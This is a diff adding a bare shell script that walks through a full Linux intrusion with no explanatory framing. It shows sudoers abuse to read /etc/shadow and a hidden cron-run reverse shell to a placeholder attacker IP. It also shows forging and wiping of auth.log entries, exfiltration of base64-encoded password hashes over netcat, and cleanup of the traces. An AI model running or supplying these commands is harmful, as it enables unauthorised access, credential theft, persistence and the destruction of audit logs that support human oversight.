@@ -1,0 +1,21 @@
+sudo -l
+sudo visudo  # Added: user ALL=(ALL) NOPASSWD: /bin/cat
+sudo /bin/cat /etc/shadow
+
+echo '#!/bin/bash' > /tmp/.stealth.sh
+echo 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1' >> /tmp/.stealth.sh
+chmod +x /tmp/.stealth.sh
+crontab -e  # Dropped cronjob: * * * * * /tmp/.stealth.sh
+
+echo "Accepted password for root from 127.0.0.1" | sudo tee -a /var/log/auth.log
+truncate -s 0 /var/log/auth.log
+sudo sed -i 's/Failed password/Accepted password/' /var/log/auth.log
+
+nc -lvnp 8888 > secret.txt
+base64 /etc/shadow | nc <attacker_ip> 8888
+base64 -d secret.txt > /tmp/.stealth
+
+crontab -r
+rm -f /tmp/.stealth.sh
+rm secret.txt
+sudo sed -i '/127.0.0.1/d' /var/log/auth.log
